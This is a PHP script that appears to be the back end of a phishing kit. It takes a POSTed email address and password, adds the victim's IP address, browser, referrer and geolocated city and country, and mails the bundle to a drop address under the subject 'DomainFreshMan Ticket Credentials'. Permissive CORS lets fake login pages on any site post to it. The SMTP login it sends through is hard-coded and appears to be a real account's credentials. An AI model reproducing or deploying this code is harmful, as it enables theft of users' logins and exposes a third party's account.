<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

if (isset($_SERVER['HTTP_ORIGIN'])) {
	// Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one
	// you want to allow, and if so:
	header('Access-Control-Allow-Origin: *');
	header('Access-Control-Allow-Credentials: true');
	header('Access-Control-Max-Age: 1000');
}

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
	if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD'])) {
		// may also be using PUT, PATCH, HEAD etc
		header("Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE");
	}

	if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS'])) {
		header("Access-Control-Allow-Headers: Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, request-startTime");
	}
	exit(0);
}

function getUserIpAddr()
{
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		//ip from share internet
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		//ip pass from proxy
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE)
{
	$output = NULL;
	if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
		$ip = $_SERVER["REMOTE_ADDR"];
		if ($deep_detect) {
			if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
				$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
				$ip = $_SERVER['HTTP_CLIENT_IP'];
		}
	}
	$purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
	$support    = array("country", "countrycode", "state", "region", "city", "location", "address");
	$continents = array(
		"AF" => "Africa",
		"AN" => "Antarctica",
		"AS" => "Asia",
		"EU" => "Europe",
		"OC" => "Australia (Oceania)",
		"NA" => "North America",
		"SA" => "South America"
	);
	if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
		$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
		if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
			switch ($purpose) {
				case "location":
					$output = array(
						"city"           => @$ipdat->geoplugin_city,
						"state"          => @$ipdat->geoplugin_regionName,
						"country"        => @$ipdat->geoplugin_countryName,
						"country_code"   => @$ipdat->geoplugin_countryCode,
						"continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
						"continent_code" => @$ipdat->geoplugin_continentCode
					);
					break;
				case "address":
					$address = array($ipdat->geoplugin_countryName);
					if (@strlen($ipdat->geoplugin_regionName) >= 1)
						$address[] = $ipdat->geoplugin_regionName;
					if (@strlen($ipdat->geoplugin_city) >= 1)
						$address[] = $ipdat->geoplugin_city;
					$output = implode(", ", array_reverse($address));
					break;
				case "city":
					$output = @$ipdat->geoplugin_city;
					break;
				case "state":
					$output = @$ipdat->geoplugin_regionName;
					break;
				case "region":
					$output = @$ipdat->geoplugin_regionName;
					break;
				case "country":
					$output = @$ipdat->geoplugin_countryName;
					break;
				case "countrycode":
					$output = @$ipdat->geoplugin_countryCode;
					break;
			}
		}
	}
	return $output;
}



function buildMail($email, $password)
{
    $dateTime = date("l jS \of F Y h:i:s A");
    $hostName = $_SERVER['HTTP_REFERER'];
	$browserName = get_browser(null, true)['browser'] ?? 'N/A';
    $ipAddress = getUserIpAddr();
    $ipData = ip_info($ipAddress);
    $country = $ipData['country'] ?? 'N/A';
	$state = $ipData['state'] ?? 'N/A';
	$city = $ipData['city'] ?? 'N/A';

    $message = "";
    $message .= "Email : {$email} <br>";
    $message .= "Password : {$password} <br>";
    $message .= "Date : {$dateTime} <br>";
    $message .= "Browser : {$browserName} <br>";
    $message .= "Host : {$hostName} <br>";
    $message .= "IP Address : {$ipAddress} <br>";
    $message .= "Country : {$country} <br>";
    $message .= "State : {$state} <br>";
    $message .= "City : {$city}";

	return $message;
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {

	if (isset($_POST['email']) && isset($_POST['password'])) {
		//Instantiation and passing `true` enables exceptions
		$mail = new PHPMailer(true);

		try {
			//Server settings
			$mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
			$mail->isSMTP();                                            //Send using SMTP
			$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
			$mail->SMTPAuth   = true;                                   //Enable SMTP authentication
			$mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
			$mail->Port       = 587;                                    //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above
			$mail->Username   = 'ach0820@snu.ac.kr';                     //SMTP username
			$mail->Password   = 'achh1967!!';                               //SMTP password

			//Recipients
			$mail->setFrom('ach0820@snu.ac.kr', 'Monotomic.io');

			//Enter you email address
			$mail->addAddress('joe-resultmail@example.net', '');     //Add a recipient

            $message = buildMail($_POST['email'], $_POST['password']);

			//Content
			$mail->isHTML(true);                                  //Set email format to HTML
			$mail->Subject = '**DomainFreshMan Ticket Credentials**';
			$mail->Body    = $message;
			$mail->AltBody = strip_tags($message);

			$mail->send();

			http_response_code(200);

			echo json_encode([
				'message' => "Message has been sent"
			]);
		} catch (Exception $e) {

			http_response_code(500);

			echo json_encode([
				'message' => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"
			]);
			exit(0);
		}
	} else {
		http_response_code(422);

		echo json_encode([
			'message' => "The given data is invalid",
			'errors' => [
				'email' => 'The email is required',
				'password' => 'The password is required',
			]
		]);
		exit(0);
	}
} else {
	http_response_code(405);
	exit(0);
}
